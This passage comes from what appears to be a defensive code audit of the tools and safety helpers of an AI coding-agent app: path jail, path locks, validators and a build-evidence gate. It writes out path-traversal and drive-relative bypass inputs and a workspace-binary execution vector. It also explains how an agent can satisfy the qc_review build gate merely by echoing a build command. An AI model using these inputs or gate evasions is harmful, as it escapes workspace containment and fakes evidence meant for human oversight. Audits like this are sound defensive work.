  `timeout(...)`; on expiry the future is dropped, so the
  `for c in children.iter_mut() { c.kill().await }` at `:224-226` — which lives
  *inside* the cancelled future — is never reached. Only `kill_on_drop` fires,
  which is best-effort and subject to G10-75. The message at `:147-151` nevertheless
  states "Children were killed."
- **G10-77 (MEDIUM, CONFIRMED) — `boot_wait_s` and `timeout_s` have no relational
  validation, so a plausible call can never succeed.** The probe needs
  `boot_wait_s` plus up to `PROBE_DEFAULT_HTTP_TIMEOUT` (10 s, `:36`) to fit inside
  `timeout_s`. `e2e_probe(boot_wait_s=30)` with the default `timeout_s=30` (`:34`)
  times out before the HTTP GET is ever issued, every time, and reports "probe URL
  '…' did not respond with '…' before the deadline" — an error that blames the
  application for a parameter conflict. Neither the schema nor the description
  mentions the relationship or the separate 10 s HTTP timeout.
- **G10-78 (LOW, CONFIRMED)** — no cap on `start_cmds.len()`; the array is spawned
  in a loop (`:178-211`) with no bound.
- **Not a defect:** `response_body_excerpt` uses `body.chars().take(400)` (`:236`),
  which is UTF-8-correct. This is the one place in the tool tree where a
  short-string truncation was written safely alongside the three that were not
  (G10-61, G10-54, T18).

---

#### `write_interface_spec` — `write_interface_spec.rs`

**Schema** `{routes: [{method, path required, description?, request_shape?,
response_shape?, status_codes?, auth_required?, notes?}] (required),
mode?: enum[overwrite|merge] (default "overwrite"), conventions?}`. `routes` is
parsed with `serde::Deserialize` (`:106`), so a malformed entry produces a real
parse error rather than a silent default.
**Body** (`:100-186`): parse routes → validate `mode` in code (`:120`) → render
markdown → target `<working_dir>/INTERFACE.md` (`:137`) → in merge mode read the
existing file → `std::fs::write` → success.

**Description quality — asserts a requirement no code enforces.** "REQUIRED before
qc_review on any task that produces or modifies HTTP routes." The only gate on
`qc_review` is the build-evidence check in `update_task_status_tool.rs:133-162`,
which knows nothing about INTERFACE.md. The description also says the
`api_contract` check will flag undeclared fields "on the next write" — that check
(`validate.rs:650-678`) returns `None` and silently skips whenever INTERFACE.md is
absent (`:660-661` uses `?`), so the enforcement it promises is inert until this
tool has already run.

**Defects**
- **G10-79 (HIGH, CONFIRMED) — the default mode silently destroys the whole
  contract file, with no checkpoint and no undo.** `mode` defaults to
  `"overwrite"` (`:118`, and `"default": "overwrite"` in the schema at `:86`), and
  the overwrite branch (`:153-171`) rebuilds the file from **only the routes in
  this call**. Unlike `write_file`, this tool calls no
  `auto_checkpoint_before_write`, no `PostFileWrite` hook, and no validator.
  *Scenario:* `worker-backend` adds one new route, calls
  `write_interface_spec(routes=[{…one route…}])` with no `mode`, and every
  previously declared route disappears. `tier2_6_api_contract` then reports every
  existing frontend consumer as "not declared in INTERFACE.md" on its next write,
  and the frontend worker — whose recipe treats this file as its single source of
  truth — starts deleting working API calls.
- **G10-80 (HIGH, CONFIRMED) — `mode="merge"` is an unlocked read-modify-write, and
  it degrades to an overwrite on any read failure.** No `path_lock::acquire_for`
  anywhere in the file, and the adapter cannot supply one either: `extract_path_arg`
  (`tool_adapter.rs:44-46`) looks for an argument named `"path"` and this tool has
  none, so `_path_guard` is `None`. Two workers merging concurrently both read the
  old content at `:141` and both write at `:174`; the later write wins and the
  earlier worker's routes are lost while its tool result says "Wrote N route(s)".
  Worse, `:141` is `std::fs::read_to_string(&path).unwrap_or_default()` — a
  transient read error (routine on Windows when another process holds the file
  open) yields `""`, which fails the `!existing.is_empty()` test at `:146` and drops
  the call into the **overwrite** branch. A merge silently becomes a full
  replacement.
- **G10-81 (MEDIUM, CONFIRMED) — `method` and `path` are unvalidated free text.**
  The schema description enumerates "GET/POST/PUT/DELETE/PATCH/HEAD/OPTIONS" and
  nothing checks it; `format_route:190` just upper-cases whatever arrived. A route
  written as `{"method": "get all", "path": "events"}` renders as
  `### GET ALL events` and is then the contract the frontend worker is instructed to
  treat as authoritative.
- **G10-82 (MEDIUM, CONFIRMED)** — `mode="merge"` performs no deduplication (stated
  at `:147-150`) and there is no size cap, so a worker that merges on every tick
  grows INTERFACE.md without bound. The file is read in full by
  `tier2_6_api_contract` on **every** `.ts/.tsx/.js/.jsx` write
  (`write_file.rs:184`), so the cost of an oversized INTERFACE.md is paid on every
  frontend file write.
- **G10-83 (LOW, CONFIRMED)** — `requires_permission()` is explicitly `false`
  (`:98`) on a tool whose default mode is destructive.

---

#### `validate.rs` — the shared validation surface

**Not a `Tool`.** It has no `Tool` impl and no registry entry; `mcp_server/server.rs:149`
listing `validate` among tools that are "NOT exposed" is therefore describing a
tool that never existed (**G10-02**). It is reached only through three callers:
`write_file.rs:150,160,171,184` (tiers 1, 2, 2.5, 2.6), `edit_file.rs:215`
(tier 1 only), and `check_file.rs:124,138,154,170,186` (all five). Its full
internals — validator inventory, spawn mechanics, timeouts, missing-binary
behaviour, and blocking semantics — are audited in **§2.8**.

Two facts belong here because they are *tool-surface* facts, not helper internals:

- **G10-84 (HIGH, CONFIRMED) — three of the five values in `check_file`'s
  `type_checker` enum do nothing, and one is silently overridden.** The schema
  advertises `["auto","mypy","pyright","tsc","eslint"]` (`check_file.rs:343`), but
  `tier3_types` (`validate.rs:734-748`) matches on `(ext, checker)` and only
  `Some("mypy")` for `.py` and `Some("eslint")` for `.js`/`.jsx` are ever
  consulted. `"pyright"` falls into the `("py", _)` arm, which runs
  `run_pyright_or_mypy` — auto-detection, i.e. identical to `"auto"`. `"tsc"` falls
  into `("ts"|"tsx", _)`, likewise identical to `"auto"`. And
  `type_checker: "eslint"` on a `.ts` file matches `("ts"|"tsx", _)` **first** and
  runs tsc, ignoring the explicit request with no notice. The model is offered five
  choices, three of which are indistinguishable from the default and one of which is
  overridden without a word.
- **G10-85 (MEDIUM, CONFIRMED) — `write_file` runs four validators and `edit_file`
  runs one, on the same file, with no way for the model to know.**
  `write_file.rs:150-192` runs tiers 1, 2, 2.5 and 2.6; `edit_file.rs:215` runs tier
  1 only. An agent that edits a `.tsx` file gets no import, export, or
  API-contract feedback; identical content written via `write_file` gets all four.
  Neither description mentions which validators run, so the agent cannot reason
  about the difference and will read `edit_file`'s silence as a clean bill of
  health.

---

### 2.8 Safety helpers

The four modules in `builtin_tools/` that have no `Tool` impl. Everything above
leans on them, so each is audited against its own stated contract rather than
against a schema.

---

#### `path_jail.rs` — workspace containment

**Contract, as written** (`:9-13`): "`validate_workspace_path(target, workspace)`
canonicalizes both inputs and returns Ok(canonical_target) ONLY when the canonical
target is inside the canonical workspace."

**What it actually checks** (`:137-155`):
1. `canonicalize_workspace` (`:26-32`) — `workspace.canonicalize()`; **errors if the
   workspace does not exist**, deliberately, so the jail cannot degrade to a no-op.
2. `canonicalize_target` (`:39-83`) — if the target exists, `canonicalize()` it. If
   it does not, walk up until an ancestor exists, canonicalize *that*, then re-join
   the skipped leaf names.
3. `strip_verbatim_prefix` (`:89-96`) — strips a literal `\\?\` from both.
4. `paths_match_prefix` (`:102-128`) — on Windows, lowercase both, trim trailing
   separators from the workspace, string-prefix compare, then require the next byte
   to be a separator or end-of-string. On non-Windows, `Path::starts_with` (component
   comparison).

**Who calls it — the complete set.** `grep -rn "path_jail\|validate_workspace_path"`
over `src-tauri/src` returns call sites in exactly **four** modules:

| Calls the jail | Site |
|---|---|
| `write_file` | `write_file.rs:70` |
| `edit_file` | `edit_file.rs:90` |
| `append_file` | `append_file.rs:73` |
| `bash` | `bash.rs:62` (cwd), `bash.rs:287`, `bash.rs:296` (redirect targets) |

**Does NOT call the jail — the complete set of path-taking tools:**

| Tool | Path argument | `is_read_only` | Consequence |
|---|---|---|---|
| `read_file` | `path` | **true** | auto-approved (§3.4); reads any file on the machine (T12) |
| `list_directory` | `path` (optional) | **true** | auto-approved; enumerates any directory (T13) |
| `grep` | `path` | **true** | auto-approved; walks any subtree (T13) |
| `glob` | `path` | **true** | auto-approved; walks any subtree (T13) |
| `check_file` | `path` | **true** | auto-approved; **executes a checker against any path** (G10-17, G10-86) |
| `annotate_file` | `file_path` | false | writes an annotation against an arbitrary string (G10-62) |
| `analyze_diff` | `repo_path` | **true** | auto-approved; reads any repo and sends it to an LLM (G10-57) |
| `e2e_probe` | *(none — `start_cmds`)* | false | no path to jail; runs arbitrary shell (G10-73) |
| `write_interface_spec` | *(none)* | false | target derived from `working_dir`, safe by construction |

**This confirms the sibling audit exactly:** `read_file`, `grep`, `glob` and
`list_directory` have no path jail **and** are auto-approved, because
auto-approval in PA mode is keyed on `is_read_only()` (§3.4). The set is in fact
larger than the sibling audit found — `check_file` and `analyze_diff` are also
read-only, auto-approved, and unjailed, and both of those *do* something with the
path beyond reading it.

**Bypass analysis — each vector tested against the code.**

| Vector | Result | Mechanism |
|---|---|---|
| `..` traversal, existing target | **Blocked** | `target.exists()` → `canonicalize()` resolves `..` at the OS layer; the canonical path is compared |
| `..` traversal, non-existent target | **Blocked, but rewritten** — see G10-87 | `Path::file_name()` returns `None` for a `..` component (`:54`), so `..` is never pushed to `tail`; the rejoined path cannot contain `..` and cannot escape the canonical ancestor |
| Symlink / directory junction, existing target | **Blocked** | `canonicalize()` resolves links (`GetFinalPathNameByHandle` on Windows) |
| Symlink / junction as the parent of a new file | **Blocked** | the *ancestor* is canonicalized at `:58`, so `<ws>/link/new.txt` where `link → C:\Users` canonicalizes the ancestor to `C:\Users` and is rejected |
| Case differences on NTFS | **Blocked** | `paths_match_prefix` lowercases both sides on Windows (`:105-106`) |
| `\\?\` verbatim prefix | **Blocked** | stripped from both sides before comparison (`:139-140`) |
| Shared-prefix sibling (`C:\foo` vs `C:\foobar`) | **Blocked** | the next-byte-must-be-a-separator check at `:116-120`; there is a test for it (`:218-229`) |
| UNC path | **Blocked for escape, but corrupts the returned path** — G10-88 | |
| Windows drive-relative `C:foo` | **Blocked in the jailed tools, escapes in the unjailed ones** — G10-89 | |
| TOCTOU (replace the path with a symlink between check and write) | **Not defended** — G10-90 | |

**Defects**

- **G10-86 (CRITICAL, CONFIRMED) — the unjailed, auto-approved `check_file` executes
  a binary supplied by the workspace.** `validate::resolve_python(working_dir)`
  (`validate.rs:880-915`) builds a candidate list beginning with
  `{working_dir}\.venv\Scripts\python.exe` (Windows) / `{working_dir}/.venv/bin/python3`
  (Unix), returns the first that exists, and `check_python_syntax:186` runs it. So
  any `.py` file passed to `check_file` — a tool with `is_read_only() = true`,
  `requires_permission() = false`, no path jail, and auto-approval in every PA mode
  — causes AutoDev to execute an executable that lives inside the workspace tree.
  *Scenario:* a worker is pointed at a cloned repository that ships a
  `.venv/Scripts/python.exe`; the first `check_file(path="anything.py")` — or the
  first `write_file` of any `.py` file, which runs the same tier-1 path
  (`write_file.rs:150`) — runs that binary with the app's privileges, no prompt, and
  no record. This is a strictly more direct vector than the ESLint-flat-config path
  already recorded as G10-15, because it needs no config file and no `checks`
  argument: writing one Python file is enough.
- **G10-87 (MEDIUM, CONFIRMED) — a `..` in the non-existent tail is silently deleted
  rather than refused, so the tool writes to a path the caller did not name.**
  `canonicalize_target:49-81` accumulates `tail` from `cursor.file_name()`, and
  `file_name()` is `None` for a `..` component, so those components are dropped and
  never re-joined. On Linux — where `Path::exists()` is a per-component syscall and
  therefore returns false for any path traversing a non-existent directory —
  `write_file(path="newdir/../../../etc/passwd")` walks up to the workspace root,
  finds it existing, and rejoins `newdir` + `etc` + `passwd`, returning
  `<ws>/newdir/etc/passwd`. That is inside the jail, so the write is **accepted**
  and lands at a path bearing no relation to the request. The jail is not breached;
  it is the *silence* that is the defect — the agent is told `✓ Wrote <ws>/newdir/etc/passwd`
  and has no way to detect that its path was rewritten. (On Windows the Win32 layer
  collapses `..` lexically before `exists()`, so the same input usually resolves and
  is correctly rejected — the behaviour differs by platform, see §6.)
- **G10-88 (MEDIUM, CONFIRMED) — `strip_verbatim_prefix` corrupts UNC paths, and the
  corrupted string is what the caller writes to.** `:89-96` strips a literal `\\?\`
  from any path. `canonicalize()` on a UNC path returns `\\?\UNC\server\share\...`;
  stripping the prefix yields `UNC\server\share\...`, which is no longer a UNC path
  at all — it is a **relative** path whose first component is the literal directory
  name `UNC`. Prefix comparison still succeeds when the workspace is also UNC
  (both sides are mangled identically), so the call is *approved*, and
  `validate_workspace_path` then returns that mangled string as `Ok(canonical)`.
  `write_file.rs:70` assigns it to `path` and `std::fs::write(&path, …)` at the end
  of the tool resolves `UNC\server\share\…` against the process CWD. *Failure:* with
  a workspace on a network share, every write lands in a junk `UNC\` tree under
  `src-tauri/` and the tool reports success. The correct strip is `\\?\UNC\` →
  `\\`, which the function does not implement.
- **G10-89 (MEDIUM, CONFIRMED) — Windows drive-relative paths (`C:foo`) bypass
  workspace resolution entirely in every unjailed tool.** `read_file`'s
  `resolve_path` (`read_file.rs:196-199`) — the same two-line helper used across the
  file tools — is `if p.is_absolute() { p } else { working_dir.join(path) }`.
  `Path::new("C:foo").is_absolute()` is **false** on Windows (a drive-relative path
  has a prefix but no root), so it takes the `join` branch; and `PathBuf::push`'s
  documented Windows behaviour is that a path with a prefix but no root **replaces
  self entirely**. The join therefore discards `working_dir` and yields `C:foo`,
  which the OS resolves against the process's per-drive current directory. In
  `write_file` / `edit_file` / `append_file` the jail catches the result (it
  canonicalizes to somewhere outside the workspace and is refused); in `read_file`,
  `grep`, `glob`, `list_directory` and `check_file` there is no jail, so the path
  resolves against `src-tauri/` (the `tauri dev` CWD) with no error and no warning.
- **G10-90 (LOW, CONFIRMED) — check/use race.** `validate_workspace_path` returns a
  canonical path which the caller then writes to some milliseconds later
  (`write_file.rs:70` → `:115`+, with a `create_dir_all` and a checkpoint in
  between). Nothing re-validates at write time and nothing opens with
  `O_NOFOLLOW`/`FILE_FLAG_OPEN_REPARSE_POINT`, so a component swapped for a symlink
  between the two points is followed. Low practical severity (it needs a local
  attacker already able to write inside the workspace) but it is the reason the jail
  is a containment aid, not a security boundary — and the module header calls it a
  "load-bearing safety net", which oversells it.
- **G10-91 (LOW, CONFIRMED) — the jail's error path is indistinguishable from a
  configuration failure.** `canonicalize_workspace` failing (`:27`) and a genuine
  escape attempt (`:145`) both return `Err(String)` and both are surfaced by every
  caller as a plain `ToolResult::error`. A workspace that has been renamed or
  unmounted therefore presents to the model as "Path '…' is outside the workspace",
  and the model's self-correction — retry with a different relative path — can never
  succeed.

**Verdict.** As an *escape* barrier for the four tools that call it, `path_jail` is
sound: `..`, symlinks, junctions, case, verbatim prefixes and shared-prefix siblings
are all handled, and there are tests for most of them. Its failures are (a) that
five path-taking tools never call it and four of those are auto-approved, (b) that
two of its normalisation steps corrupt rather than reject unusual inputs (G10-87,
G10-88), and (c) that it is described in the source as a security control while
being a TOCTOU-vulnerable advisory check.

---

#### `path_lock.rs` — process-wide per-path async mutex

**Design** (`:1-41`): one `tokio::sync::Mutex<()>` per lock key, in a
`OnceLock<StdMutex<HashMap<PathBuf, Arc<AsyncMutex<()>>>>>` (`:49-54`). The registry
mutex is held only across the HashMap lookup/insert (`:94-103`) and dropped before
awaiting the per-path mutex, so registry contention is bounded. Guards are
`OwnedMutexGuard`, released on drop.

**Is the lock key normalised?** **No — and this is the module's central defect.**
`lock_key` (`:77-84`) joins a relative target onto `working_dir` and then applies
`lexically_normalise` (`:58-68`), which strips `CurDir` and pops on `ParentDir`. It
does **not** canonicalize (deliberately — the file may not exist yet), does **not**
case-fold, and does **not** resolve symlinks. The key is therefore a
**spelling-sensitive path string**, exactly the defect class the sibling audit found
in checkpoint retention: `C:\a\b.rs` and `c:\a\b.rs` and `\\?\C:\a\b.rs` are three
different keys for one file. The module's own tests (`:118-139`) only ever exercise
`/work` + `src/x.rs` variants, so the case and canonicalisation axes are untested.

The consequences are already partly recorded as **G10-09** (`write_file` locks the
pre-jail `resolved` path at `write_file.rs:83` while `edit_file` locks the
post-jail canonical path at `edit_file.rs:108`). Two further consequences:

- **G10-92 (HIGH, CONFIRMED) — a PA-mode caller and an MCP caller lock different
  keys for the same file whenever the spellings differ.** The module header promises
  the opposite at `:40-41`: "`mcp_server::tool_adapter` — Mode 2 entry point uses
  the same registry so PA-mode and Mode 2 callers contend on the same key." Both
  sides do use the same registry, but they compute the key from different strings:
  · PA `write_file` → `lock_key(resolved, ctx.working_dir)` where `resolved` came
    from `resolve_path` and `working_dir` is the configured workspace string;
  · PA `edit_file`/`append_file` → `lock_key(canonical, ctx.working_dir)` where
    `canonical` came out of `path_jail`, i.e. lowercased-on-disk casing with the
    `\\?\` prefix stripped;
  · MCP adapter → `lock_key(raw_arg_string, working_dir)` where `working_dir` is
    re-read from `config.db` on every call (`tool_adapter.rs:181-186`).
  Whenever the configured workspace casing differs from the on-disk casing — the
  normal situation on Windows, where a user types `c:\airs foundry\proj` and NTFS
  stores `C:\AIRS Foundry\proj` — `edit_file`'s key and `write_file`'s key differ in
  case, `lock_key` does not fold it, and the two tools take **two different
  mutexes for the same file**. The lost-update race the module exists to prevent
  proceeds exactly as if the module were absent, while every caller believes it is
  serialised.
- **G10-93 (MEDIUM, CONFIRMED) — the adapter-level lock is dead code, and the two
  tools that actually need it are invisible to it.** `tool_adapter.rs:253-270`
  acquires a path lock for any tool that is (a) not read-only and (b) not in
  `PATH_LOCKED_INSIDE_TOOL = ["write_file","edit_file","append_file"]` (`:40`) and
  (c) has a top-level string argument named exactly `"path"`
  (`extract_path_arg`, `:44-46`). Enumerating the 38 registered tools, the modules
  declaring a top-level `"path"` schema property are `read_file`, `list_directory`,
  `grep`, `glob`, `check_file` (all read-only, excluded by (a)) and `write_file`,
  `edit_file`, `append_file` (all excluded by (b)). **No registered tool satisfies
  all three conditions**, so `_path_guard` is always `None` and the entire Bug-B
  block never executes. Meanwhile the two non-read-only tools that genuinely mutate
  files outside the write-tool trio use different argument names and are therefore
  unreachable by it: `annotate_file` (`file_path`, G10-62) and
  `write_interface_spec` (no path argument at all — it derives
  `<working_dir>/INTERFACE.md` internally, G10-80).

**Can it deadlock?** **No cycle is reachable in the current tree** (CONFIRMED), for
three separate reasons, each of which is incidental rather than designed:
1. Every acquisition site takes **exactly one** lock. `write_file`, `edit_file`,
   `append_file` each call `acquire_for` once; the adapter calls `acquire_owned`
   once. There is no site that holds lock A and then asks for lock B, so no
   lock-ordering cycle can form.
2. Self-deadlock via the adapter re-locking a key the tool will lock again is
   prevented by name, through the `PATH_LOCKED_INSIDE_TOOL` exclusion
   (`tool_adapter.rs:253-254`) — the comment at `:246-247` states the intent
   explicitly. This is a **name-matched** guard: adding a fourth tool that calls
   `path_lock::acquire_for` internally and forgetting to add its name to that array
   would produce an immediate, permanent self-deadlock on a non-reentrant
   `tokio::sync::Mutex`. It is one line of vigilance away from a hang.
3. No tool invokes another tool while holding a lock.

**Is it held across an await that can block indefinitely?** **Yes** — this is
**G10-10**, and §2.8 can now name the exact unbounded await. The guard taken at
`write_file.rs:83` lives until the end of `execute`, which awaits
`validate::tier1_syntax` at `:150`. For `.ts/.tsx/.jsx` that reaches
`check_tsc_syntax` (`validate.rs:267-282`), which is `tokio::process::Command::new("tsc")…output().await`
with **no `tokio::time::timeout` anywhere in `validate.rs`** (a grep for `timeout`
over the 1086-line file returns zero hits). A `tsc` that hangs — waiting on a
network-mounted `node_modules`, blocked on a stalled `tsconfig` extends, or simply
paused — blocks *every writer of that path in the process, forever*, with no
timeout, no cancellation and no diagnostic. `edit_file.rs:215` has the same shape.

**Two further defects**

- **G10-94 (MEDIUM, CONFIRMED) — the registry mutex is `.unwrap()`ed, so one panic
  anywhere under the lock turns every subsequent write into a panic.**
  `acquire_owned:95` is `registry().lock().unwrap()`. A `std::sync::Mutex` is
  poisoned by any panic while held; after poisoning, every future `acquire_owned`
  panics on the `unwrap`, i.e. **every `write_file`, `edit_file` and `append_file`
  in the process dies** with no recovery short of a restart. The window is narrow
  (only HashMap operations run under the lock) but it is not zero, and the failure
  mode is total. The correct handling — `unwrap_or_else(|e| e.into_inner())` — is
  one call away.
- **G10-95 (LOW, CONFIRMED) — unbounded growth is keyed by *spelling*, not by
  file.** `:26-30` acknowledges that entries are never garbage-collected and argues
  the bound is "one entry per path the fleet has ever touched … thousands of files".
  Because the key is unnormalised (above), the real bound is one entry per distinct
  *string* ever passed, so a caller that varies case or separators grows the map
  without touching new files. Combined with `working_dir` being re-read from
  `config.db` on every MCP call (`tool_adapter.rs:181-186`), a workspace change
  mid-session re-keys every subsequent lock — and, worse, drops mutual exclusion
  between calls made before and after the change.

**Verdict.** The registry mechanics are correct — the guard is owned, the sync mutex
is not held across the await, and no lock cycle exists. The module nonetheless
fails at its stated purpose, because the key is a raw path string: the case
insensitivity that `path_jail` explicitly handles (`path_jail.rs:102-121`) is
absent here, and the two tools most likely to be spelled differently — a PA
`write_file` and an MCP `edit_file` — are exactly the pair the module was written
to serialise. Add the unbounded await under the lock (G10-10) and the dead adapter
branch (G10-93), and `path_lock` currently provides less protection than its
callers' comments assert on every axis.

---

#### `build_evidence.rs` — the qc_review gate's evidence store

**Shape.** A `OnceLock<Mutex<HashMap<String, Vec<BuildEvidence>>>>` (`:63-66`) keyed
by `session_id`, entries stamped with `Instant::now()` and swept on read against a
15-minute TTL (`EVIDENCE_TTL`, `:26`). Written from exactly one place —
`bash.rs:114` — and read from exactly one place —
`update_task_status_tool.rs:141`. Never persisted; `most_recent_smoke` (`:153-162`)
has **no callers at all**.

**The `classify()` heuristic in full** (`:74-120`). The command is lowercased once
(`:75`) and then tested with `str::contains` — **no tokenisation, no argv parsing,
no anchoring except in the smoke branch**:

| Order | Kind | Predicate |
|---|---|---|
| 1 | `Smoke` | (`starts_with("timeout ")` **or** `contains(" timeout ")`) **and** contains any of `npm run dev`, `npm start`, `uvicorn`, `flask run`, `cargo run`, `go run` |
| 2 | `Node` | contains any of `npm run build`, `npm install`, `npm ci`, `npm test`, `npm run test`, `pnpm build`, `pnpm install`, `pnpm test`, `yarn build`, `yarn install`, `yarn test`, `vite build`, `tsc --noemit`, `tsc -b` |
| 3 | `Cargo` | contains any of `cargo test`, `cargo build`, `cargo check`, `cargo clippy` |
| 4 | `Python` | contains any of `uv run pytest`, `uv sync`, `pytest`, `python -m pytest`, `py.test`, `uv pip install`, `pip install -r` |
| 5 | `Go` | contains any of `go test`, `go build`, `go mod tidy` |
| — | `None` | otherwise → `record` returns immediately (`:126`) and nothing is stored |

Note the ordering is load-bearing: `Smoke` is tested first and
`most_recent_build` **excludes** `Smoke` (`:147`), so a command classified as smoke
is *removed* from build evidence rather than added to it.

**Every false-positive path — a non-build recorded as a build.** All CONFIRMED by
reading `classify`; each is a substring match against the raw command line.

1. **Any command that merely mentions a build string.** `git commit -m "fix cargo
   build"`, `echo "npm run build"`, `grep -rn "cargo test" .`, `rg pytest`,
   `git log --grep="npm test"`, `cat notes.md # npm run build` — every one is
   recorded as build evidence with the exit code of the *mentioning* command, which
   is normally 0. This is the single largest hole: **writing a commit message can
   satisfy the qc_review build gate.**
2. **Bare `pytest` matches any substring occurrence.** `cat pytest.ini`,
   `ls .pytest_cache`, `mkdir pytest`, `poetry run pytest --collect-only` all
   classify as `Python`.
3. **`go test` and `go build` match inside longer words.** `contains("go test")` is
   true for `mongo test`, `django test`, `lingo test`; `contains("go build")` is
   true for `cargo build` (though `Cargo` is tested first and wins).
4. **Dependency installs count as builds.** `npm install`, `npm ci`,
   `pnpm install`, `yarn install`, `uv sync`, `uv pip install`, `pip install -r`
   are all in the hit lists. `npm install lodash` — which compiles nothing and
   proves nothing about the project — satisfies the gate. `npm install` in a repo
   whose code does not compile returns 0 and is recorded as a passing build.
5. **A failed command is still evidence.** `record` (`:125-136`) stores the entry
   regardless of `exit_code`; the read side must inspect it. The module comment
   (`:14-17`) says the exit code exists so a failed build can veto `qc_review`,
   which puts the whole burden on `update_task_status_tool.rs:141` — see G10-99.
6. **A real build misclassified as smoke.** `timeout 300 cargo run --bin build-all`
   hits branch 1 and is stored as `Smoke`, which `most_recent_build` then filters
   out (`:147`). The command ran a build; the gate sees no build.
7. **The false " timeout " trigger.** `contains(" timeout ")` (`:78`) matches any
   command with the word anywhere — `git commit -m "raise the timeout for cargo
   run"` enters the smoke branch and, because it also contains `cargo run`, is
   recorded as `Smoke`.
8. **Windows rewrite drift** (already recorded in §2.2): `bash.rs:114` passes the
   **rewritten** command, so the stored proof-of-build string is not what the agent
   asked to run.

**Every false-negative path — a real build not recorded.** CONFIRMED.

1. **Whole ecosystems are absent.** No `make`, `cmake`, `ninja`, `gradle`, `mvn`,
   `dotnet build`, `msbuild`, `bazel`, `swift build`, `xcodebuild`, `composer
   install`, `bundle exec`. A C++/Java/.NET project can never satisfy the gate.
2. **Common near-misses in covered ecosystems.** `npm i` (only `npm install` is
   listed), `pnpm i`, `bun install`, `bun run build`, `deno task build`,
   `npm run typecheck`, `npm run lint`, `npm run compile`, `npm run ci`,
   `cargo nextest run`, `go vet`, `python -m unittest`, `tox`, `nox`,
   `./build.sh`, `make ci`.
3. **A build run through any tool other than `bash` records nothing.**
   `build_evidence::record` has exactly one caller. `check_file(path="x.ts",
   checks=["types"])` runs a full `tsc --noEmit` over the project
   (`validate.rs:785-798`) and stores no evidence; so does every `write_file` of a
   `.ts` file (`write_file.rs:150`). The agent can type-check the entire codebase
   and still be refused at the gate.
4. **A timed-out build records nothing** — **G10-25**, already recorded:
   `build_evidence::record` sits in the `Ok(Ok(..))` arm at `bash.rs:114`, so a
   `cargo test` that exceeds the 120 s default leaves no trace. The gate is hardest
   on the longest builds.
5. **The 15-minute TTL is wall-clock-fragile.** `Instant` is monotonic and the TTL
   is 15 minutes (`:26`); any worker tick where the build and the status update are
   more than 15 minutes apart — a large `cargo build` followed by review and a
   commit — silently loses its evidence. Nothing warns; the transition simply fails
   with "no recorded build evidence".
6. **Nothing is persisted.** An app restart, a crash, or a sidecar reconnect between
   the build and the status update discards all evidence for every session.

**Defects**

- **G10-96 (HIGH, CONFIRMED) — the qc_review build gate is satisfiable by any
  command containing a build-shaped substring, including one that runs nothing.**
  The combination of `contains` matching on the raw command line (`:94`, `:100`,
  `:109`, `:114`) with `record` storing the caller's exit code means
  `bash(command='echo "npm run build"')` returns 0, is classified `Node`, and is
  stored as proof that the project builds. Any agent that has learned the gate's
  error text can trivially defeat it, and — far more likely in practice — any agent
  that legitimately runs `git commit -m "cargo build fixes"` defeats it by accident.
  A gate that cannot distinguish running a build from mentioning one is not a gate.
- **G10-97 (MEDIUM, CONFIRMED) — dependency installation is classified as build
  evidence.** `npm install`, `npm ci`, `pnpm install`, `yarn install`, `uv sync`,
  `uv pip install` and `pip install -r` (`:89-91`, `:106-108`) prove that packages
  resolved, not that any source compiled. The most common real sequence — `npm
  install` succeeds, `npm run build` then fails — leaves a **successful** Node
  evidence record as the most recent build, and `most_recent_build` returns the
  latest by `recorded_at` regardless of what came after it only if the failing build
  was not itself recorded; when the failing build *is* recorded the newer entry
  wins, but any subsequent bare `npm install` re-establishes a passing record.
- **G10-98 (MEDIUM, CONFIRMED) — the doc comment lists commands the classifier does
  not match.** `BuildEvidenceKind::Node` is documented at `:39` as covering
  "`npm run build`, `npm install`, `npm run dev`, `pnpm build`, `yarn build`", but
  `npm run dev` appears **only** in the smoke branch's inner list (`:79`) and not in
  `node_hits` (`:88-93`). `npm run dev` on its own — without a `timeout` prefix —
  classifies as `None` and records nothing. Anyone reading the enum to understand
  what counts will be wrong.
- **G10-99 (MEDIUM, SUSPECTED — consumer not fully read in this audit) — the exit
  code is stored but the veto depends entirely on one caller.** `record` stores
  `exit_code` unconditionally and `most_recent_build` returns it unfiltered
  (`:141-150`); the module comment (`:14-17`) states the purpose is to veto
  `qc_review` when the most recent build failed. That check exists only at
  `update_task_status_tool.rs:141`; nothing in `build_evidence.rs` enforces it, so
  a second consumer added later would silently accept failed builds as evidence.
  Flagged as SUSPECTED because this audit read the gate's guard condition
  (`update_task_status_tool.rs:133-162`, §2.3) but not every branch of its
  exit-code handling.
- **G10-100 (LOW, CONFIRMED) — `most_recent_smoke` has zero callers.** `:153-162`
  is dead code, and with it the entire `Smoke` classification: smoke commands are
  computed, stored, excluded from build evidence, and never read by anything. The
  only effect the `Smoke` kind has on the system is the false-negative in
  false-positive path 6 above — it *removes* evidence.
- **G10-101 (LOW, CONFIRMED) — session keys are never removed.** `most_recent_build`
  `retain`s expired entries out of the `Vec` (`:145`) but never removes the empty
  `Vec` or its key from the `HashMap`. Combined with the adapter minting a fresh
  synthetic `session_id` per call when `__session_id` is omitted
  (`tool_adapter.rs:204-222`, the root of G10-33), a long-running server accumulates
  one permanent map entry per build-shaped bash call, forever.

**Verdict.** `build_evidence` is honest about being approximate — the module comment
says "We don't need accuracy — we need a directional signal" (`:10-12`). The problem
is that `update_task_status_tool.rs:133-162` uses it as a **hard blocking gate**, and
a directional signal used as a gate is a gate that is both trivially defeated
(G10-96, G10-97) and routinely wrong in the other direction (all six false-negative
paths, of which G10-25 and the `check_file`-runs-tsc case are the most common in
normal operation). Its two most consequential structural properties — process-global
and unpersisted, and unreachable-by-any-tool-but-`bash` — mean that in Mode 2, where
the build and the status update may not even share a session id, the gate is closer
to a coin flip than a control.

---

#### `validate.rs` — the validator inventory

**Which validators exist.** Five entry points, all `pub`, all reached only from
`write_file`, `edit_file` and `check_file` (§2.7).

| Tier | Entry point | File types | Mechanism |
|---|---|---|---|
| 1 | `tier1_syntax` (`:96-112`) | `.json` → `check_json` (`:114`); `.yaml/.yml` → `check_yaml` (`:135`); `.toml` → `check_toml` (`:161`) | **in-process** parse (`serde_json`, `serde_yaml`, `toml`) |
| 1 | ″ | `.py` → `check_python_syntax` (`:184`) | subprocess `<resolved python> -m py_compile <file>` |
| 1 | ″ | `.js/.mjs/.cjs` → `check_node_syntax` (`:219`) | subprocess `node --check <file>` |
| 1 | ″ | `.ts/.tsx/.jsx` → `check_tsc_syntax` (`:267`) | subprocess `tsc --noEmit --allowJs --isolatedModules …` |
